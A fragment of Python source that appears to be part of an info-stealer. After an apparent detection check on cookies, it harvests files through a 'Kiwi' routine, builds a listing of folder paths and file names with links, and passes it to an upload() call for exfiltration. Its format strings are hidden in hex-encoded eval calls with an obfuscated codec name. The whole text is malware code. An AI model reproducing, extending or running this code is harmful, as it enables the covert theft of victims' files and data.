DETECTED=Trust(Cookies)
if not DETECTED:
    wikith=Kiwi()
    for thread in wikith:thread.join()
    time.sleep(0.2)
    filetext='\n'
    for arg in KiwiFiles:
        if len(arg[2])!=0:
            foldpath=arg[1]
            foldlist=arg[2]
            filetext+=eval(binascii.unhexlify(b'6622f09f9381207b666f6c64706174687d5c6e22').decode('8ftu'[::+-+-(-(+1))]))
            for ffil in foldlist:
                a=ffil[0].split('/')
                fileanme=a[len(a)-1]
                b=ffil[1]
                filetext+=eval(binascii.unhexlify(b'6622e29494e294803a6f70656e5f66696c655f666f6c6465723a205b7b66696c65616e6d657d5d287b627d295c6e22').decode('8ftu'[::+-+-(-(+1))]))
            filetext+='\n'
    upload('kiwi',filetext)
